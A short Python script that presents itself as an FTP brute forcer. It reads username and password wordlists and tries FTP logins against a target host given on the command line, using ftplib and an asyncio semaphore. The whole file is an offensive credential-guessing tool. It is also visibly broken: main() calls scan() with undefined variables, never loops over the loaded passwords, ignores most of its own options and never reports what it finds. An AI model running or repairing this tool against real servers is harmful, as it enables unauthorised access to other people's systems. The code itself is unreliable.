import asyncio
import ftplib 
import time 
import argparse

parser = argparse.ArgumentParser(description="ftp brute forcer")
parser.add_argument("-t", "--target", help="host")
parser.add_argument("-p", "--port", help="port", default=21)
parser.add_argument("-u", "--username", help="username")
parser.add_argument("-U", "--Uwordlist", help="wordlist for username")
parser.add_argument("-w", "--password", help="password")
parser.add_argument("-W", "--Pwordlist", help="wordlist for passwords")
parser.add_argument("-s", "--semaphore", help="thread count")
args = parser.parse_args()

USERNAME_FILE = "python\wordlist\username_wordlist.txt"
PASSWORD_FILE = "python\wordlist\password_wordlist.txt"

found = asyncio.Event()

def load_paths():
    with open(PASSWORD_FILE, "r") as f:
        paths = []

        for line in f:
            line = line.strip()
            if line:
                paths.append(line)
        return paths

async def scan(host,port,username,password,sem):
    async with sem:
        if found.is_set():
            return
        try:
            ftp = ftplib.FTP()
            ftp.connect(host,port)
            if ftp.login(username,password):
                found.set()
                ftp.quit()
        except(Exception):
            print("host is down or wrong credentials")


async def main():
    start = time.perf_counter()
    paths = load_paths()
    sem = asyncio.Semaphore(150)

    print(f"starting scan on {args.target}")
    print(f"loaded {len(paths)} passwords\n")

    await scan(args.target,args.port,username,password,sem)
    
    print(f"\nScan completed in {time.perf_counter() - start:.2f}s")

if __name__ == "__main__":
    asyncio.run(main())